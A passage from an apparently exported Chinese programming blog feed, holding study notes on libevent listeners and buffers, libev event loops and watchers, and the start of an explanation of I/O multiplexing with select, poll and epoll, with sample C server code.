class="hljs-type">unsigned</span> <span class="hljs-type">short</span> client_port;<br>    convertip_to_str(AF_INET, &amp;client, client_addr, &amp;client_port);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;client:%s:%hu is connected!\n&quot;</span>, client_addr, client_port);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> **argv)</span><br>&#123;<br><span class="hljs-keyword">if</span> (argc != <span class="hljs-number">3</span>) &#123;<br>Usage(argv[<span class="hljs-number">0</span>]);<br>&#125;<br><span class="hljs-type">int</span> fd = NewSocket(argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>], <span class="hljs-number">10</span>);<br>    <span class="hljs-comment">//创建一个监听集合</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">event_base</span> *<span class="hljs-title">base</span> =</span> event_base_new();<br>    <span class="hljs-comment">//创建一个事件</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">event</span> *<span class="hljs-title">new_event</span> =</span> event_new(base, fd, EV_READ | EV_PERSIST, handler_cb, <span class="hljs-literal">NULL</span>);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timeval</span> <span class="hljs-title">timeout</span>=</span> &#123;<span class="hljs-number">450</span>,<span class="hljs-number">30</span>&#125;;<span class="hljs-comment">//设置超时时间</span><br>    <span class="hljs-comment">//注册事件</span><br>event_add(new_event, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-comment">//等待事件的发生</span><br>event_base_dispatch(base);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-连接监听器和数据缓冲区-evconnlistener-bufferevent"><a href="#4-连接监听器和数据缓冲区-evconnlistener-bufferevent" class="headerlink" title="4.连接监听器和数据缓冲区(evconnlistener,bufferevent)"></a>4.连接监听器和数据缓冲区(evconnlistener,bufferevent)</h3><h4 id="1-基本的使用步骤"><a href="#1-基本的使用步骤" class="headerlink" title="1.基本的使用步骤"></a>1.基本的使用步骤</h4><ul><li>1.创建一个事件监听器</li><li>2.设置事件触发的回调函数</li><li>3.开始监听事件</li></ul><h4 id="2-基本的API"><a href="#2-基本的API" class="headerlink" title="2.基本的API"></a>2.基本的API</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-comment">//连接监听器</span><br><br><span class="hljs-comment">//创建一个新的socket并且绑定监听,返回一个struct evconnlistener类型</span><br><span class="hljs-keyword">struct</span> evconnlistener *<br><span class="hljs-title function_">evconnlistener_new_bind</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> event_base *base, evconnlistener_cb cb,</span><br><span class="hljs-params">    <span class="hljs-type">void</span> *ptr, <span class="hljs-type">unsigned</span> flags, <span class="hljs-type">int</span> backlog, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *sa,</span><br><span class="hljs-params">    <span class="hljs-type">int</span> socklen)</span>;<br><br><span class="hljs-comment">//将创建好的socket开始监听</span><br>evconnlistener_new(<span class="hljs-keyword">struct</span> event_base *base,<br>    evconnlistener_cb cb, <span class="hljs-type">void</span> *ptr, <span class="hljs-type">unsigned</span> flags, <span class="hljs-type">int</span> backlog,<br>    <span class="hljs-type">evutil_socket_t</span> fd);<br><br>evconnlistener_disable(<span class="hljs-keyword">struct</span> evconnlistener *lev);<br>evconnlistener_enable(<span class="hljs-keyword">struct</span> evconnlistener *lev);<br><span class="hljs-comment">//重新设置回调函数</span><br>evconnlistener_set_cb(<span class="hljs-keyword">struct</span> evconnlistener *lev,<br>    evconnlistener_cb cb, <span class="hljs-type">void</span> *arg);<br><br><br><span class="hljs-comment">//数据缓冲区</span><br><br><span class="hljs-comment">//创建缓冲区</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title function_">bufferevent_socket_new</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> event_base *base,<span class="hljs-type">int</span> fd,<span class="hljs-type">int</span> option)</span>;<br><br><span class="hljs-comment">//设置回调函数</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title function_">bufferevent_setcb</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bufev,</span><br><span class="hljs-params">    bufferevent_data_cb readcb, bufferevent_data_cb writecb,</span><br><span class="hljs-params">    bufferevent_event_cb eventcb, <span class="hljs-type">void</span> *cbarg)</span><br><br><span class="hljs-keyword">struct</span> <span class="hljs-title function_">bufferevent_connect</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bev,</span><br><span class="hljs-params">    <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *sa, <span class="hljs-type">int</span> socklen)</span>;<br><span class="hljs-comment">//从libevent自行维护的缓冲区中读取数据</span><br><span class="hljs-type">size_t</span><br><span class="hljs-title function_">bufferevent_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bufev, <span class="hljs-type">void</span> *data, <span class="hljs-type">size_t</span> size)</span>;<br><br><span class="hljs-comment">//向libevent自行维护的缓冲区中写入数据</span><br><span class="hljs-type">int</span><br><span class="hljs-title function_">bufferevent_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bufev, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *data, <span class="hljs-type">size_t</span> size)</span>;<br><br></code></pre></td></tr></table></figure><h4 id="3-实例"><a href="#3-实例" class="headerlink" title="3.实例"></a>3.实例</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;event.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;event2/listener.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;strings.h&gt;</span></span><br><span class="hljs-comment">//读回调函数</span><br>bufferevent_data_cb <span class="hljs-title function_">read_cb</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bev, <span class="hljs-type">void</span> *arg)</span> &#123;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">1024</span>];<br>    bufferevent_read(bev, buffer, <span class="hljs-number">10</span>);<span class="hljs-comment">//从接收缓冲区读取数据</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;read buffer :%s\n&quot;</span>, buffer);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><span class="hljs-comment">//写回调函数</span><br>bufferevent_data_cb <span class="hljs-title function_">write_cb</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bev, <span class="hljs-type">void</span> *arg)</span> &#123;<br>    <span class="hljs-type">char</span> *str = <span class="hljs-string">&quot;hello,world&quot;</span>;<br>    bufferevent_write(bev, str, <span class="hljs-built_in">strlen</span>(str) + <span class="hljs-number">1</span>);<span class="hljs-comment">//向客户端发送消息</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><span class="hljs-comment">//异常处理函数</span><br>bufferevent_event_cb <span class="hljs-title function_">error_cb</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bev, <span class="hljs-type">short</span> event, <span class="hljs-type">void</span> *arg)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br>evconnlistener_cb<br><span class="hljs-title function_">listen_cb</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> evconnlistener *listener, <span class="hljs-type">evutil_socket_t</span> fd, <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">int</span> socklen,</span><br><span class="hljs-params">          <span class="hljs-type">void</span> *arg)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">event_base</span> *<span class="hljs-title">base</span> =</span> (<span class="hljs-keyword">struct</span> event_base *) arg;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bufferevent</span> *<span class="hljs-title">buffevent</span> =</span> bufferevent_socket_new(base, fd, BEV_OPT_CLOSE_ON_FREE);<span class="hljs-comment">//创建缓冲区</span><br>    bufferevent_setcb(buffevent, read_cb, write_cb, error_cb, <span class="hljs-literal">NULL</span>);<span class="hljs-comment">//设置回调函数</span><br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> **argv)</span><br>&#123;<br><span class="hljs-type">socklen_t</span> SOCKLEN = (<span class="hljs-type">socklen_t</span>) (<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr));<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">event_base</span> *<span class="hljs-title">base</span> =</span> event_base_new();<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> <span class="hljs-title">bind_addr</span>;</span><br>    convertip_to_net(AF_INET, &amp;bind_addr, <span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">10000</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">evconnlistener</span> *<span class="hljs-title">listener</span> =</span> evconnlistener_new_bind(base, listen_cb, (<span class="hljs-type">void</span> *) base,<br>LEV_OPT_CLOSE_ON_FREE | LEV_OPT_REUSEABLE_PORT, <span class="hljs-number">-1</span>,<br>&amp;bind_addr, SOCKLEN);<br>    event_base_dispatch(base);<span class="hljs-comment">//循环监听事件</span><br>    evconnlistener_free(listener);<span class="hljs-comment">//释放连接监听器</span><br>    event_base_free(base);<span class="hljs-comment">//释放监听集合;</span><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>libev学习笔记</title>
    <link href="/2022/04/17/libev%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/04/17/libev%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="libev学习笔记"><a href="#libev学习笔记" class="headerlink" title="libev学习笔记"></a>libev学习笔记</h1><h3 id="1-什么是libev"><a href="#1-什么是libev" class="headerlink" title="1.什么是libev?"></a>1.什么是libev?</h3><p>libev是一个强大的网络reactor,支持多种事件(信号,I&#x2F;O,定时器…..)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//基本数据类型的宏定义</span><br><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> EV_A  loop </span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> EV_A_ EV_A,</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> EV_P  struct ev_loop *loop </span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> EV_P_ EV_P,</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ev_io</span></span><br><span class="hljs-class">&#123;</span><br>  EV_WATCHER_LIST (ev_io)<br>  <span class="hljs-type">int</span> fd;     <span class="hljs-comment">/* ro */</span><br>  <span class="hljs-type">int</span> events; <span class="hljs-comment">/* ro */</span><br>&#125; ev_io;<br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ev_loop</span></span><br><span class="hljs-class">  &#123;</span><br>    ev_tstamp ev_rt_now;<br>    <span class="hljs-meta">#<span class="hljs-keyword">define</span> ev_rt_now ((loop)-&gt;ev_rt_now)</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">define</span> VAR(name,decl) decl;</span><br>      <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;ev_vars.h&quot;</span></span><br>    <span class="hljs-meta">#<span class="hljs-keyword">undef</span> VAR</span><br>  &#125;;<br></code></pre></td></tr></table></figure><h3 id="2-使用方法"><a href="#2-使用方法" class="headerlink" title="2.使用方法"></a>2.使用方法</h3><h4 id="1-创建ev-loop对象"><a href="#1-创建ev-loop对象" class="headerlink" title="1.创建ev_loop对象"></a>1.创建ev_loop对象</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> ev_loop *<span class="hljs-title function_">ev_loop_new</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flag)</span>;<br><span class="hljs-comment">//创建一个ev_loop对象,这里的flag用于选择什么backend来实现多路复用</span><br><span class="hljs-comment">//flag的一些宏定义,一般用于选择后台多路复用机制,一般使用EVFLAG_AUTO(0)即可</span><br><br>* EVBACKEND_SELECT<br>* EVBACKEND_POLL<br>* EVBACKEND_EPOLL                       <br>* EVBACKEND_KQUEUE<br>* EVBACKEND_DEVPOLL<br>* EVBACKEND_PORT<br><br>* EVFLAG_NOINOTIFY                     <span class="hljs-comment">// 不适用inofity调用来使用ev_stat.这样可以减少fd使用。</span><br>* EVFLAG_SIGNALFD                      <span class="hljs-comment">// 使用signalfd来检测信号是否发生，同样这样可以减少fd</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">ev_loop_destroy</span><span class="hljs-params">(EV_P)</span>;<br><span class="hljs-comment">//销毁一个ev_loop对象</span><br></code></pre></td></tr></table></figure><h4 id="2-绑定用户数据以及reactor的开始与退出"><a href="#2-绑定用户数据以及reactor的开始与退出" class="headerlink" title="2.绑定用户数据以及reactor的开始与退出"></a>2.绑定用户数据以及reactor的开始与退出</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-type">void</span> <span class="hljs-title function_">ev_set_userdata</span><span class="hljs-params">(EV_P_ <span class="hljs-type">void</span> *data)</span>;<br>  <span class="hljs-type">void</span> *<span class="hljs-title function_">ev_userdata</span><span class="hljs-params">(EV_P)</span>;<br>  <span class="hljs-comment">//ev_loop如何运行和停止   </span><br>  <span class="hljs-type">void</span> <span class="hljs-title function_">ev_run</span><span class="hljs-params">(EV_P_ <span class="hljs-type">int</span> flags)</span>;<br>  <span class="hljs-type">void</span> <span class="hljs-title function_">ev_break</span><span class="hljs-params">(EV_P_ <span class="hljs-type">int</span> how)</span>;<br>  <span class="hljs-comment">//flags参数</span><br>* <span class="hljs-number">0</span>             <span class="hljs-comment">//通常这是我们想要的，每次轮询在poll都会等待一段时间然后处理pending事件。</span><br>* EVRUN_NOWAIT  <span class="hljs-comment">//运行一次，在poll时候不会等待。这样效果相当于只是处理pending事件。</span><br>* EVRUN_ONCE    <span class="hljs-comment">//运行一次，但是在poll时候会等待，然后处理pending事件。</span><br>而how有下面这几个：<br><br>* EVBREAK_ONE   <span class="hljs-comment">//只是退出一次ev_run这个调用。通常来说使用这个就可以了。</span><br>* EVBREAK_ALL   <span class="hljs-comment">//退出所有的ev_run调用。这种情况存在于ev_run在pengding处理时候会递归调</span><br>ev_set_loop_release_cb (EV_P_ <span class="hljs-type">void</span> (*release)(EV_P) EV_NOEXCEPT, <span class="hljs-type">void</span> (*acquire)(EV_P) EV_NOEXCEPT)     <span class="hljs-comment">//设置回调函数,用于epoll_wait前后调用</span><br></code></pre></td></tr></table></figure><h4 id="3-设置轮询时间"><a href="#3-设置轮询时间" class="headerlink" title="3.设置轮询时间"></a>3.设置轮询时间</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//在event_loop里面我们还关心一件事情，就是每次event_loop轮询的时间长短。通常来说这个不会是太大问题，但是在高性能情况下面我们需要设置</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">ev_set_io_collect_interval</span><span class="hljs-params">(EV_P_ ev_tstamp interval)</span>;<span class="hljs-comment">//设置轮询时间</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">ev_set_timeout_collect_interval</span><span class="hljs-params">(EV_P_ ev_tstamp interval)</span>;<span class="hljs-comment">//设置超时时间</span><br></code></pre></td></tr></table></figure><h4 id="4-Watcher"><a href="#4-Watcher" class="headerlink" title="4.Watcher"></a>4.Watcher</h4><p>watcher 相当于eventhandler,一般ev_loop用于创建libev里面的reactor对象,而watcher就是事件触发后处理事件的模块,通常绑定fd,以及发生事件后处理事件的回调函数,下列的type用于区分不同的watcher<br>watcher的状态</p><ul><li><p>initialiased 已经初始化</p></li><li><p>active 调用start进行注册</p></li><li><p>pending 已经触发事件但是还没有处理</p></li><li><p>inactive 调用stop注销.这个状态和已经初始化是一样的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">void</span> <span class="hljs-params">(*)</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> ev_loop *loop, ev_TYPE *watcher, <span class="hljs-type">int</span> revents)</span> callback; <span class="hljs-comment">// callback都是这种类型</span><br>ev_init (ev_TYPE *watcher, callback);                         <span class="hljs-comment">// 初始化watcher</span><br>ev_TYPE_set (ev_TYPE *watcher, [args]);                       <span class="hljs-comment">// 设置watcher</span><br>ev_TYPE_init (ev_TYPE *watcher, callback, [args]);            <span class="hljs-comment">// 通常使用这个函数最方便，初始化和设置都在这里</span><br>ev_TYPE_start (loop, ev_TYPE *watcher);                       <span class="hljs-comment">// 注册watcher</span><br>ev_TYPE_stop (loop, ev_TYPE *watcher);                        <span class="hljs-comment">// 注销watcher</span><br>ev_set_priority (ev_TYPE *watcher, <span class="hljs-type">int</span> priority);             <span class="hljs-comment">// 设置优先级</span><br>ev_feed_event (loop, ev_TYPE *watcher, <span class="hljs-type">int</span> revents);          <span class="hljs-comment">// 这个做跨线程通知非常有用，相当于触发了某个事件。</span><br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">ev_is_active</span> <span class="hljs-params">(ev_TYPE *watcher)</span>;                         <span class="hljs-comment">// watcher是否active.</span><br><span class="hljs-type">bool</span> <span class="hljs-title function_">ev_is_pending</span> <span class="hljs-params">(ev_TYPE *watcher)</span>;                        <span class="hljs-comment">// watcher是否pending.</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">ev_clear_pending</span> <span class="hljs-params">(loop, ev_TYPE *watcher)</span>;                <span class="hljs-comment">// 清除watcher pending状态并且返回事件</span><br>————————————————<br>版权声明：本文为CSDN博主「工程师WWW」的原创文章，遵循CC <span class="hljs-number">4.0</span> BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：https:<span class="hljs-comment">//blog.csdn.net/weiwangchao_/article/details/52961041</span><br></code></pre></td></tr></table></figure></li></ul><h4 id="5-实例"><a href="#5-实例" class="headerlink" title="5.实例"></a>5.实例</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//一个简单的io驱动事件</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ev.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">stdin_cb</span><span class="hljs-params">(EV_P_ ev_io *w,<span class="hljs-type">int</span> revents)</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;hello,world&quot;</span>);<br>    ev_io_stop(EV_A_ w);<br>    ev_break(EV_A_ EVBREAK_ALL);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ev_loop</span> *<span class="hljs-title">loop</span>=</span> EV_DEFAULT;<br>    ev_io stdin_watcher;<br>    ev_io_init(&amp;stdin_watcher,stdin_cb,<span class="hljs-number">0</span>,EV_READ);<span class="hljs-comment">//初始化watcher,设置事件处理的回调函数</span><br>    ev_io_start(loop,&amp;stdin_watcher);<span class="hljs-comment">//设置reactor的watcher</span><br>    ev_run(loop,<span class="hljs-number">0</span>);<span class="hljs-comment">//开始监听事件的到来,一旦事件到来,指向对应的watcher中的回调函数</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="6-和epoll对比"><a href="#6-和epoll对比" class="headerlink" title="6.和epoll对比"></a>6.和epoll对比</h4><p>ev_loop相当于struct event_base *base,监听集合<br>watcher相当于struct event *event,但是相比于epoll中的event,watcher中设置了相应的回调函数。<br>ev_run相当于epoll_wait函数开始监听事件的到来,到事件到来的时候调用相应的回调函数处理相应的事件</p>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>I/O多路复用</title>
    <link href="/2022/04/17/I-O%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8/"/>
    <url>/2022/04/17/I-O%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="I-x2F-O多路复用"><a href="#I-x2F-O多路复用" class="headerlink" title="I&#x2F;O多路复用"></a>I&#x2F;O多路复用</h1><h3 id="1-什么是I-x2F-O多路复用"><a href="#1-什么是I-x2F-O多路复用" class="headerlink" title="1.什么是I&#x2F;O多路复用"></a>1.什么是I&#x2F;O多路复用</h3><p>I&#x2F;O 多路复用是一种同步IO模型，实现一个线程可以监视多个文件句柄；<br>一旦某个文件句柄就绪，就能够通知应用程序进行相应的读写操作；<br>没有文件句柄就绪就会阻塞应用程序，交出CPU。</p><h3 id="2-为什么会有I-x2F-O多路复用机制"><a href="#2-为什么会有I-x2F-O多路复用机制" class="headerlink" title="2.为什么会有I&#x2F;O多路复用机制"></a>2.为什么会有I&#x2F;O多路复用机制</h3><p>没有IO多路复用机制时，有BIO、NIO两种实现方式，但它们都有一些问题</p><h5 id="1-同步阻塞"><a href="#1-同步阻塞" class="headerlink" title="1.同步阻塞"></a>1.同步阻塞</h5><p>服务端采用单线程，当 accept 一个请求后，在 recv 或 send 调用阻塞时，将无法 accept 其他请求（必须等上一个请求处理 recv 或 send 完 ）（无法处理并发）</p><p>服务端采用多线程，当 accept 一个请求后，开启线程进行 recv，可以完成并发处理，但随着请求数增加需要增加系统线程，大量的线程占用很大的内存空间，并且线程切换会带来很大的开销，10000个线程真正发生读写实际的线程数不会超过20%，每次accept都开一个线程也是一种资源浪费。</p><h5 id="2-异步阻塞"><a href="#2-异步阻塞" class="headerlink" title="2.异步阻塞"></a>2.异步阻塞</h5><p>服务器端当 accept 一个请求后，加入 fds 集合，每次轮询一遍 fds 集合 recv (非阻塞)数据，没有数据则立即返回错误，每次轮询所有 fd （包括没有发生读写实际的 fd）会很浪费 CPU</p><h3 id="3-实现I-x2F-O多路复用的几种方式"><a href="#3-实现I-x2F-O多路复用的几种方式" class="headerlink" title="3.实现I&#x2F;O多路复用的几种方式"></a>3.实现I&#x2F;O多路复用的几种方式</h3><ul><li><p>1.select</p></li><li><p>2.poll</p></li><li><p>3.epoll</p></li></ul><h4 id="1-select实现I-x2F-O多路复用"><a href="#1-select实现I-x2F-O多路复用" class="headerlink" title="1.select实现I&#x2F;O多路复用"></a>1.select实现I&#x2F;O多路复用</h4>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span 